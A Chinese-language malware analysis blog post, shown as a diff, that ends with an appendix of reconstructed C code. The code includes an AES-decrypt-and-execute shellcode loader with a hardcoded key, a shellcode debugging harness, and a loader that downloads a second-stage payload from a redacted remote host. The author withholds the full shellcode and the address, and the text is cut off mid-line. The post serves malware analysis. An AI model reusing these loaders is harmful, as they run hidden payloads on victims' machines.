+                      alt="2026-5-4_Last_DIE"
+                ><br>查看其导出表，发现有三个函数，<code>load</code>、<code>run</code>和<code>shangxianbiaoji</code>（猜测是上线标记）：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-4_Last_Export.png"
+                      alt="2026-5-4_Last_Export"
+                ><br>对其字符串表进行查看：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2025-5-4_Strings.png"
+                      alt="2025-5-4_Strings"
+                ><br>可以看出这是一个模块化远控框架。具体的逻辑这里不再公开。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="1-ShellCode-Loader"><a href="#1-ShellCode-Loader" class="headerlink" title="1.ShellCode Loader"></a>1.ShellCode Loader</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;shlobj.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bcrypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;bcrypt.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HANDLE hFile = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> pbSecret[<span class="number">48</span>] = &#123;</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x56</span>, <span class="number">0xB7</span>, <span class="number">0x19</span>, <span class="number">0xC0</span>, <span class="number">0x7E</span>, <span class="number">0xFA</span>, <span class="number">0x4D</span>, <span class="number">0x60</span>, <span class="number">0xDD</span>, <span class="number">0x9B</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xAD</span>, <span class="number">0x26</span>, <span class="number">0xF2</span>, <span class="number">0x5F</span>, <span class="number">0xDB</span>, <span class="number">0xBF</span>, <span class="number">0xC1</span>, <span class="number">0xC0</span>, <span class="number">0x88</span>, <span class="number">0xD1</span>, <span class="number">0x9A</span>, <span class="number">0x55</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0xBC</span>, <span class="number">0x17</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BYTE pbIV[<span class="number">16</span>] = &#123; <span class="number">0x6D</span>, <span class="number">0x29</span>, <span class="number">0xEF</span>, <span class="number">0xE0</span>, <span class="number">0xE6</span>, <span class="number">0x82</span>, <span class="number">0x50</span>, <span class="number">0xAC</span>, <span class="number">0x5A</span>, <span class="number">0x34</span>, <span class="number">0x8A</span>, <span class="number">0xF3</span>, <span class="number">0x7A</span>, <span class="number">0x0E</span>, <span class="number">0x79</span>, <span class="number">0xBF</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-256-CBC 解密</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">decrypt_aes256_cbc</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* cipher,     <span class="comment">// 输入密文</span></span></span><br><span class="line"><span class="params">    DWORD cipher_len,          <span class="comment">// 密文长度（必须16对齐）</span></span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* key,        <span class="comment">// 32字节 (pbSecret)</span></span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* iv,         <span class="comment">// 16字节 (pbIV)</span></span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* output,     <span class="comment">// 输出缓冲区</span></span></span><br><span class="line"><span class="params">    DWORD* output_len          <span class="comment">// 输入=缓冲区大小，输出=实际大小</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    BCRYPT_ALG_HANDLE hAlg = <span class="literal">NULL</span>;</span><br><span class="line">    BCRYPT_KEY_HANDLE hKey = <span class="literal">NULL</span>;</span><br><span class="line">    PUCHAR keyObj = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DWORD objLen = <span class="number">0</span>;</span><br><span class="line">    DWORD dataLen = <span class="number">0</span>;</span><br><span class="line">    DWORD blockLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    <span class="type">int</span> success = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 1. 打开 AES 算法</span></span><br><span class="line">        status = BCryptOpenAlgorithmProvider(&amp;hAlg, <span class="string">L&quot;AES&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 设置 CBC 模式</span></span><br><span class="line">        status = BCryptSetProperty(</span><br><span class="line">            hAlg,</span><br><span class="line">            <span class="string">L&quot;ChainingMode&quot;</span>,</span><br><span class="line">            (PUCHAR)<span class="string">L&quot;ChainingModeCBC&quot;</span>,</span><br><span class="line">            <span class="keyword">sizeof</span>(<span class="string">L&quot;ChainingModeCBC&quot;</span>),</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 获取 key object 长度</span></span><br><span class="line">        status = BCryptGetProperty(</span><br><span class="line">            hAlg,</span><br><span class="line">            <span class="string">L&quot;ObjectLength&quot;</span>,</span><br><span class="line">            (PUCHAR)&amp;objLen,</span><br><span class="line">            <span class="keyword">sizeof</span>(objLen),</span><br><span class="line">            &amp;dataLen,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        keyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, objLen);</span><br><span class="line">        <span class="keyword">if</span> (!keyObj) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 生成密钥</span></span><br><span class="line">        status = BCryptGenerateSymmetricKey(</span><br><span class="line">            hAlg,</span><br><span class="line">            &amp;hKey,</span><br><span class="line">            keyObj,</span><br><span class="line">            objLen,</span><br><span class="line">            key,</span><br><span class="line">            <span class="number">32</span>, <span class="comment">// AES-256</span></span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 获取 block size</span></span><br><span class="line">        status = BCryptGetProperty(</span><br><span class="line">            hAlg,</span><br><span class="line">            <span class="string">L&quot;BlockLength&quot;</span>,</span><br><span class="line">            (PUCHAR)&amp;blockLen,</span><br><span class="line">            <span class="keyword">sizeof</span>(blockLen),</span><br><span class="line">            &amp;dataLen,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 检查长度是否对齐</span></span><br><span class="line">        <span class="keyword">if</span> (cipher_len % blockLen != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] cipher length not aligned\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 解密</span></span><br><span class="line">        status = BCryptDecrypt(</span><br><span class="line">            hKey,</span><br><span class="line">            cipher,</span><br><span class="line">            cipher_len,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            iv,</span><br><span class="line">            <span class="number">16</span>,</span><br><span class="line">            output,</span><br><span class="line">            *output_len,</span><br><span class="line">            &amp;dataLen,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (status &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 去 PKCS#7 padding</span></span><br><span class="line">        <span class="keyword">if</span> (dataLen &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> pad = output[dataLen - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (pad &gt; <span class="number">0</span> &amp;&amp; pad &lt;= <span class="number">16</span>)</span><br><span class="line">                dataLen -= pad;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *output_len = dataLen;</span><br><span class="line">        success = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="keyword">if</span> (hKey) BCryptDestroyKey(hKey);</span><br><span class="line">    <span class="keyword">if</span> (hAlg) BCryptCloseAlgorithmProvider(hAlg, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyObj) HeapFree(GetProcessHeap(), <span class="number">0</span>, keyObj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===================== 主执行逻辑 =====================</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> filePath[] = <span class="string">&quot;user.dat&quot;</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFileA(</span><br><span class="line">        filePath,</span><br><span class="line">        GENERIC_READ,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;打开文件%s Successful!\n&quot;</span>, filePath);</span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">if</span> (!GetFileSizeEx(hFile, &amp;size))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件大小：%d\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size.HighPart != <span class="number">0</span> || size.LowPart == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DWORD fileSize = size.LowPart;</span><br><span class="line"></span><br><span class="line">    BYTE* ShellCodeBuffer = (BYTE*)VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!ShellCodeBuffer) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc Successful!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD readSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> ret = ReadFile(hFile, ShellCodeBuffer, fileSize, &amp;readSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readSize != fileSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Successful!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    BYTE* payload = (BYTE*)VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!payload) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    DWORD outLen = fileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// === 解密 ===</span></span><br><span class="line">    <span class="keyword">if</span> (!decrypt_aes256_cbc(ShellCodeBuffer, fileSize, pbSecret, pbIV, payload, &amp;outLen))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decrypt_aes256_cbc Successful!\n&quot;</span>);</span><br><span class="line">    VirtualFree(ShellCodeBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Sleep(rand() % 500 + 100);</span></span><br><span class="line"></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect(payload, outLen, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)() = (<span class="type">void</span>(*)())payload;</span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    VirtualFree(payload, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h2 id="2-ShellCode-analyze"><a href="#2-ShellCode-analyze" class="headerlink" title="2.ShellCode analyze"></a>2.ShellCode analyze</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> hexData[<span class="number">2512</span>] = &#123;</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0xE4</span>, <span class="number">0xF8</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x33</span>, <span class="number">0xDB</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="comment">//由于该ShellCode直接可用，所以这里就不放全部的了</span></span><br><span class="line">    , <span class="number">0x7C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* buf = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(hexData),</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, hexData, <span class="keyword">sizeof</span>(hexData));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode at: %p\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    __debugbreak();</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())buf)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="3-Pyload2-Load"><a href="#3-Pyload2-Load" class="headerlink" title="3.Pyload2_Load"></a>3.Pyload2_Load</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_IP <span class="string">&quot;xxxxxxxxxxxx&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_PORT 0xxxxx</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_SIZE  0xxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Payload2Download</span><span class="params">(<span class="type">char</span>* Buffer)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DecryptPayload</span><span class="params">(<span class="type">char</span>* Buffer, <span class="type">int</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 分配内存 (PAGE_EXECUTE_READWRITE 允许执行)</span></span><br><span class="line">    <span class="type">void</span>* PayloadBuffer = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x80000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (PayloadBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAlloc Failed: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化内存，防止解密时读到随机垃圾值</span></span><br><span class="line">    <span class="built_in">memset</span>(PayloadBuffer, <span class="number">0</span>, <span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] 开始下载 Payload...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!Payload2Download((<span class="type">char</span>*)PayloadBuffer)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 下载失败\n&quot;</span>);</span><br><span class="line">        VirtualFree(PayloadBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 保存到文件</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;Payload2_Decrypt.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fwrite(PayloadBuffer, <span class="number">1</span>, TOTAL_SIZE, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 文件保存成功！(Payload2_Decrypt.bin)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 十六进制预览</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] 数据十六进制预览 (前 128 字节):\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* p = (<span class="type">unsigned</span> <span class="type">char</span>*)PayloadBuffer;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TOTAL_SIZE &amp;&amp; i &lt; <span class="number">128</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X 